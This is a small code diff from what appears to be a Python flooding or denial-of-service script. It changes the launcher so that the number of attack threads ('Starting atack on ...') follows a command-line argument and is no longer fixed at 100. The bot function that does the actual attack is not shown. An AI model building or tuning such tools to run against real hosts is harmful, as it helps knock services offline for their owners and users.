@@ -24,7 +24,7 @@ if len(sys.argv) == 4:
     host, port, threads = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
     print('Starting atack on %s:%s with %s thread(s)' % (host, str(port), str(threads)))
     time.sleep( 2 )
-    for i in range(100): Thread(target=new_bot).start()
+    for i in range(threads): Thread(target=new_bot).start()
 else:
     print('ip poirt threads')
     sys.exit()
